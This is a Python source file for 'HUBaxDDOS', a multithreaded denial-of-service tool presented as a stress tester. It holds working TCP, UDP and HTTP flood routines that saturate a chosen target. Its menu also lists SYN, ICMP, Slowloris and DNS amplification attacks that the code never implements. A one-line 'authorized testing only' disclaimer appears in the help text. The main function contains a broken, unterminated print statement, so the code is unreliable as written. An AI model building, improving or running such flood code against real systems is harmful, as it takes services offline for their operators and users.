#!/usr/bin/env python3
"""
HUBaxDDOS - Advanced Network Stress Testing Tool
Author: n0merc
Version: 2.0
"""

import socket
import threading
import random
import time
import sys
import os
import argparse
from datetime import datetime

# Configuration
MAX_THREADS = 1000
PACKET_SIZE = 4096
TIMEOUT = 3
ATTACK_DURATION = 300  # Default 5 minutes

class HUBaxDDOS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': None,
            'target': None
        }
        
    def show_logo(self):
        """Display the fucking awesome HUBaxDDOS logo"""
        logo = """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║  ██╗  ██╗██╗   ██╗██████╗  █████╗ ██╗  ██╗██████╗ ██████╗║
║  ██║  ██║██║   ██║██╔══██╗██╔══██╗╚██╗██╔╝██╔══██╗██╔══██╗║
║  ███████║██║   ██║██████╔╝███████║ ╚███╔╝ ██║  ██║██║  ██║║
║  ██╔══██║██║   ██║██╔══██╗██╔══██║ ██╔██╗ ██║  ██║██║  ██║║
║  ██║  ██║╚██████╔╝██████╔╝██║  ██║██╔╝ ██╗██████╔╝██████╔╝║
║  ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ║
║                                                          ║
║               ██████╗  ██████╗   ██████╗ ███████╗        ║
║               ██╔═══██╗██╔══██╗██╔═══██╗██╔════╝         ║
║               ██║   ██║██║  ██║██║   ██║███████╗         ║
║               ██║   ██║██║  ██║██║   ██║╚════██║         ║
║               ╚██████╔╝██████╔╝╚██████╔╝███████║         ║
║                ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝         ║
║                                                          ║
║           Advanced Network Stress Testing Tool           ║
║                  Version 2.0 - 2026                      ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(logo)
        
    def show_menu(self):
        """Display the main fucking menu"""
        menu = """
╔══════════════════════════════════════════════════════════╗
║                      HUBaxDDOS MENU                      ║
╠══════════════════════════════════════════════════════════╣
║  [1] TCP Flood Attack      - Standard TCP connection flood║
║  [2] UDP Flood Attack      - Connectionless UDP flood    ║
║  [3] HTTP Flood Attack     - Layer 7 HTTP request flood  ║
║  [4] SYN Flood Attack      - Half-open connection attack ║
║  [5] ICMP Flood Attack     - Ping flood attack           ║
║  [6] Slowloris Attack      - Slow HTTP headers attack    ║
║  [7] DNS Amplification     - DNS reflection attack       ║
║  [8] Multi-Vector Attack   - Combine multiple methods    ║
║  [9] Show Statistics       - Display attack stats        ║
║  [10] Stop All Attacks     - Stop all running attacks    ║
║  [11] Help                 - Show this menu              ║
║  [12] Exit                 - Exit the program            ║
╚══════════════════════════════════════════════════════════╝
        """
        print(menu)
        
    def show_help(self):
        """Show detailed fucking help"""
        help_text = """
╔══════════════════════════════════════════════════════════╗
║                      HUBaxDDOS HELP                      ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  COMMANDS:                                               ║
║  • tcp <ip> <port> <threads> <time> - TCP flood attack   ║
║  • udp <ip> <port> <threads> <time> - UDP flood attack   ║
║  • http <url> <threads> <time>      - HTTP flood attack  ║
║  • syn <ip> <port> <threads> <time> - SYN flood attack   ║
║  • icmp <ip> <threads> <time>       - ICMP ping flood    ║
║  • slow <url> <threads> <time>      - Slowloris attack   ║
║  • dns <dns_server> <target>        - DNS amplification  ║
║  • multi <ip> <port>                - Multi-vector attack║
║  • stats                            - Show statistics    ║
║  • stop                             - Stop all attacks   ║
║  • help                             - Show this help     ║
║  • exit                             - Exit program       ║
║                                                          ║
║  EXAMPLES:                                               ║
║  • tcp 192.168.1.1 80 500 60                            ║
║  • http https://target.com 300 120                       ║
║  • multi 192.168.1.1 443                                 ║
║                                                          ║
║  NOTE: This tool is for educational and authorized       ║
║  testing only. Use responsibly.                          ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
        """
        print(help_text)
        
    def generate_payload(self, size=PACKET_SIZE):
        """Generate random fucking data"""
        return random._urandom(size)
    
    def tcp_flood(self, target_ip, target_port, threads=500, duration=60):
        """TCP flood attack"""
        print(f"[+] Starting TCP Flood on {target_ip}:{target_port}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        
        self.stats['target'] = f"{target_ip}:{target_port}"
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    s.connect((target_ip, target_port))
                    for _ in range(100):
                        s.send(self.generate_payload())
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += PACKET_SIZE
                    s.close()
                except:
                    pass
        
        # Start threads
        for i in range(threads):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        print(f"[+] Attack started at {self.stats['start_time']}")
        time.sleep(duration)
        self.stop_attack()
    
    def udp_flood(self, target_ip, target_port, threads=500, duration=60):
        """UDP flood attack"""
        print(f"[+] Starting UDP Flood on {target_ip}:{target_port}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        
        self.stats['target'] = f"{target_ip}:{target_port}"
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock.sendto(self.generate_payload(), (target_ip, target_port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += PACKET_SIZE
                except:
                    pass
        
        # Start threads
        for i in range(threads):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        print(f"[+] Attack started at {self.stats['start_time']}")
        time.sleep(duration)
        self.stop_attack()
    
    def http_flood(self, url, threads=300, duration=60):
        """HTTP flood attack"""
        print(f"[+] Starting HTTP Flood on {url}")
        print(f"[+] Threads: {threads}, Duration: {duration}s")
        
        # Parse URL
        if not url.startswith('http'):
            url = 'http://' + url
        
        self.stats['target'] = url
        self.stats['start_time'] = datetime.now()
        self.attack_running = True
        
        def attack():
            headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate",
                "Connection: keep-alive",
                "Cache-Control: no-cache"
            ]
            
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(TIMEOUT)
                    s.connect((url.split('//')[1].split('/')[0], 80))
                    
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {url.split('//')[1].split('/')[0]}\r\n"
                    request += "\r\n".join(headers) + "\r\n\r\n"
                    
                    s.send(request.encode())
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += len(request)
                    s.close()
                except:
                    pass
        
        # Start threads
        for i in range(threads):
            thread = threading.Thread(target=attack)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
        
        print(f"[+] Attack started at {self.stats['start_time']}")
        time.sleep(duration)
        self.stop_attack()
    
    def show_stats(self):
        """Show attack statistics"""
        if not self.stats['start_time']:
            print("[!] No attacks have been run yet")
            return
        
        duration = datetime.now() - self.stats['start_time']
        packets_per_second = self.stats['packets_sent'] / max(duration.total_seconds(), 1)
        mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
        
        print("\n" + "="*60)
        print("HUBaxDDOS - ATTACK STATISTICS")
        print("="*60)
        print(f"Target: {self.stats['target']}")
        print(f"Start Time: {self.stats['start_time']}")
        print(f"Duration: {duration}")
        print(f"Packets Sent: {self.stats['packets_sent']:,}")
        print(f"Bytes Sent: {self.stats['bytes_sent']:,} ({mb_sent:.2f} MB)")
        print(f"Packets/Second: {packets_per_second:.2f}")
        print(f"Status: {'RUNNING' if self.attack_running else 'STOPPED'}")
        print("="*60 + "\n")
    
    def stop_attack(self):
        """Stop all attacks"""
        print("[!] Stopping all attacks...")
        self.attack_running = False
        
        # Wait for threads to finish
        for thread in self.threads:
            thread.join(timeout=1)
        
        self.threads.clear()
        print("[!] All attacks stopped")
        self.show_stats()
    
    def interactive_mode(self):
        """Interactive fucking mode"""
        self.show_logo()
        self.show_menu()
        
        while True:
            try:
                cmd = input("\nHUBaxDDOS> ").strip().lower()
                
                if cmd == 'help' or cmd == '11':
                    self.show_help()
                elif cmd == 'menu' or cmd == '':
                    self.show_menu()
                elif cmd.startswith('tcp'):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        ip = parts[1]
                        port = int(parts[2])
                        threads = int(parts[3]) if len(parts) > 3 else 500
                        duration = int(parts[4]) if len(parts) > 4 else 60
                        self.tcp_flood(ip, port, threads, duration)
                elif cmd.startswith('udp'):
                    parts = cmd.split()
                    if len(parts) >= 3:
                        ip = parts[1]
                        port = int(parts[2])
                        threads = int(parts[3]) if len(parts) > 3 else 500
                        duration = int(parts[4]) if len(parts) > 4 else 60
                        self.udp_flood(ip, port, threads, duration)
                elif cmd.startswith('http'):
                    parts = cmd.split()
                    if len(parts) >= 2:
                        url = parts[1]
                        threads = int(parts[2]) if len(parts) > 2 else 300
                        duration = int(parts[3]) if len(parts) > 3 else 60
                        self.http_flood(url, threads, duration)
                elif cmd == 'stats' or cmd == '9':
                    self.show_stats()
                elif cmd == 'stop' or cmd == '10':
                    self.stop_attack()
                elif cmd == 'exit' or cmd == '12':
                    print("[!] Exiting HUBaxDDOS...")
                    break
                else:
                    print("[!] Unknown command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                print("\n[!] Interrupted by user")
                self.stop_attack()
                break
            except Exception as e:
                print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description='HUBaxDDOS - Advanced Network Stress Testing Tool')
    parser.add_argument('-t', '--target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, help='Target port')
    parser.add_argument('-m', '--method', choices=['tcp', 'udp', 'http'], help='Attack method')
    parser.add_argument('-th', '--threads', type=int, default=500, help='Number of threads')
    parser.add_argument('-d', '--duration', type=int, default=60, help='Attack duration in seconds')
    parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
    
    args = parser.parse_args()
    
    tool = HUBaxDDOS()
    
    if args.interactive:
        tool.interactive_mode()
    elif args.target and args.method:
        if args.method == 'tcp':
            if not args.port:
                print("[!] Port required for TCP attack")
                sys.exit(1)
            tool.tcp_flood(args.target, args.port, args.threads, args.duration)
        elif args.method == 'udp':
            if not args.port:
                print("[!] Port required for UDP attack")
                sys.exit(1)
            tool.udp_flood(args.target, args.port, args.threads, args.duration)
        elif args.method == 'http':
            tool.http_flood(args.target, args.threads, args.duration)
    else:
        tool.show_logo()
        print("[!] tool.show_logo()
        print("[!] No target specified. Starting interactive mode...\n")
        tool.interactive_mode()

if __name__ == "__main__":
    main()
